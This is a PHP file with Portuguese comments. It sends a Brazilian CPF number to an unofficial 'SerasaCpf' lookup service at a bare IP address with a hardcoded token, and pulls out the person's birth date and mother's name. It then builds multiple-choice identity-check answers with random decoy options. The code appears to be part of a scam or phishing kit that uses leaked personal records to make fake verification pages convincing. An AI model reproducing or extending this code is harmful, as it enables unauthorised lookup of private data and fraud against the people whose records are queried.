<?php
    /* FUNCAO PARA PEGAR OS DADOS DA API USANDO O CPF */
    function getData($cpf){
        // Inicializa a sessão cURL
        $curl = curl_init();

        // Define a URL da API
        $url = 'http://178.18.248.9:8091/SerasaCpf?token=107589af-df2d-45ba-a3e2-19ed680304e3&cpf='.$cpf;

        // Define as opções da requisição
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

        // Envia a requisição e obtém a resposta
        $response = curl_exec($curl);

        // Fecha a sessão cURL
        curl_close($curl);

        // Exibe a resposta
        return $response;
    }


    /* FUNCAO PARA PEGAR O MES PELO NOME */
    function getNomeMes($mes){
        switch ($mes) {
            case '01':
                echo "Janeiro";
                break;
            case '02':
                echo "Fevereiro";
                break;
            case '03':
                echo "Março";
                break;
            case '04':
                echo "Abril";
                break;
            case '05':
                echo "Maio";
                break;
            case '06':
                echo "Junho";
                break;
            case '07':
                echo "Julho";
                break;
            case '08':
                echo "Agosto";
                break;
            case '09':
                echo "Setembro";
                break;
            case '10':
                echo "Outubro";
                break;
            case '11':
                echo "Novembro";
                break;
            case '12':
                echo "Dezembro";
                break;
        }
        
    }

     /* FUNCAO PARA PERGUNTA DE NASCIMENTO */
     function respostasNascimento($mes){
        $mesCorreto = $mes;
        $meses = array('01','02','03','04','05','06','07','08','09','10','11','12',);

        $mesRandom2 = 0;

    foreach($meses as $valor){
        if($valor == $mesCorreto){
            $key = array_search($mesCorreto, $meses);
        if($key!==false){
            unset($meses[$key]);
        }
        }
    }

    $rand_keys = array_rand($meses, 2);
    $mesRandom1= $meses[$rand_keys[0]];
    $mesRandom2= $meses[$rand_keys[1]];

    return $mesesFinal = array($mesCorreto,$mesRandom1,$mesRandom2);
    }

    /* FUNCAO QUE PEGA A DATA DE NASCIMENTO DENTRO DA API */
    function getDataNascimento($json){
        $anoNascimentoApi = $json->result->NASC;
        $nascimento = explode("-",$anoNascimentoApi);
        return $nascimento;
    }


     /* FUNCAO PARA REMOVER SIMBOLOS DO CPF */
     function limpa_cpf_cnpj($valor){
        $valor = trim($valor);
        $valor = str_replace(array('.','-','/'), "", $valor);
        return $valor;
       }

    /* FUNCAO DIA NASCIMENTO */
    function respostaDiaNascimento($dia){
        $diaCorreto = $dia;
        $dias = array('01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31',);


        foreach($dias as $valor){
            if($valor == $diaCorreto){
                $key = array_search($diaCorreto, $dias);
            if($key!==false){
                unset($dias[$key]);
            }
            }
        }
    
        $rand_keys = array_rand($dias, 2);
        $diaRandom1= $dias[$rand_keys[0]];
        $diaRandom2= $dias[$rand_keys[1]];
    
        return $mesesFinal = array($diaCorreto,$diaRandom1,$diaRandom2);
        }


        /* FUNCAO NOME DA MAE */

        function respostaNomeMae($nomedamae){
            $nomeCorreto = $nomedamae;

            $nomes = array('Ana Ferreira Pereira','Emily Alves Castro','Laura Santos Gomes','Marina Dias Oliveira','Maria Fernandes Melo','Giovanna Sousa Silva','Amanda Rocha Barros','Isabela Cardoso Martins','Mariana Azevedo Barbosa','Rebeca Lima Oliveira','Julia Cunha Sousa');

            foreach($nomes as $valor){
                if($valor == $nomeCorreto){
                    $key = array_search($nomeCorreto, $nomes);
                if($key!==false){
                    unset($nomes[$key]);
                }
                }
            }

            $rand_keys = array_rand($nomes, 2);
            $nomeRandom1= $nomes[$rand_keys[0]];
            $nomeRandom2= $nomes[$rand_keys[1]];
    
            return $nomesFinal = array($nomeCorreto,$nomeRandom1,$nomeRandom2);
        }
?>